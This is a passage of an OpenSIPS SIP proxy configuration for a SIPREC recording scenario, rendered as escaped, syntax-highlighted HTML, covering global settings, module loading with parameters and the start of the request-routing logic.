&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   re-generating the scenario with different options.#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Please refer to the Core CookBook at:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#      http://www.opensips.org/Resources/DocsCookbooks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for a explanation of possible statements, functions and parameters.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Global Parameters #########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the following lines to enable debugging */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable the auto temporary blacklisting of 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   not available destinations &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#disable_dns_blacklist=no&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable IPv6 lookup after IPv4 dns 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lookup failures &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#dns_try_ipv6=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* comment the next line to enable the auto discovery of local aliases
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   based on revers DNS on IPs */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auto_aliases&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:127.0.0.1:5060
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Modules Section ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIGNALING module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### StateLess module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Transaction Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_timeout&amp;#34;&lt;/span&gt;, 5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_inv_timeout&amp;#34;&lt;/span&gt;, 30&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;restart_fr_on_each_reply&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreply_avp_mode&amp;#34;&lt;/span&gt;, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Record Route Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not append from tag to the RR &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no need &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this script&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### MAX ForWarD module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIP MSG OPerationS module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipmsgops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### FIFO Management Interface&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_mode&amp;#34;&lt;/span&gt;, 0666&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### URI module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use_uri_table&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### USeR LOCation module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nat_bflag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NAT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;,   0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### REGISTRAR module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp_persistent_flag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TCP_PERSISTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line not to allow more than &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; contacts per AOR */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;registrar&amp;#34;, &amp;#34;max_contacts&amp;#34;, 10)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### ACCounting module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* what special events should be accounted ? */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;early_media&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;report_cancels&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* by default we &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not adjust the direct of the sequential requests.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; you enable this parameter, be sure the enable &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt; module */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;detect_direction&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_udp.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dialog.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b2b_entities.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;siprec.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rtpproxy.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rtpproxy&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rtpproxy_sock&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;udp:127.0.0.1:7899&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Routing Logic ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main request routing logic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;has_totag&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# handle hop-by-hop ACK (no routing required)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# sequential request within a dialog should&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# take the path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !loose_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# we do record-routing for all our traffic, so we should not&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# receive any sequential requests without Route hdr.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not here&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
